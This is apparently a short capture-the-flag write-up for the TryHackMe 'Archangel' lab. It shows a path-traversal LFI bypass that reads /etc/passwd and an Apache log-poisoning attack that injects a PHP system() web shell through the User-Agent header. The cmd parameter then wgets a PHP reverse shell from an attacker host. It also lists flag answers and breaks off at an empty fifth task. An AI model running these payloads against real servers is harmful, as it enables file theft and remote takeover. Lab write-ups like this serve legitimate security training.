# Archangel

```
export IP=10.10.245.141
```

# Material needed

1. Find the hostname: mafialive.thm

2. Interesting directory: /test.php

3. LFI protection

```
if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing'))
```

4. Bypass LFI 

```
curl http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//../etc/passwd
```

5. Apache log poisoning

```
GET /test.php?view=/var/www/html/development_testing/..//..//../log/apache2/access.log&cmd=wget http://10.8.193.113:8000/php-reverse-shell.php

User-Agent: <?php system($_GET['cmd']);?>
```

# Tasks

1. Find a different hostname? mafialive.thm

2. Find flag 1 

```
thm{f0und_th3_r1ght_h0st_n4m3}
```

3. Look for a page under development: /test.php

4. Find flag 2

```
thm{explo1t1ng_lf1}
```

5. 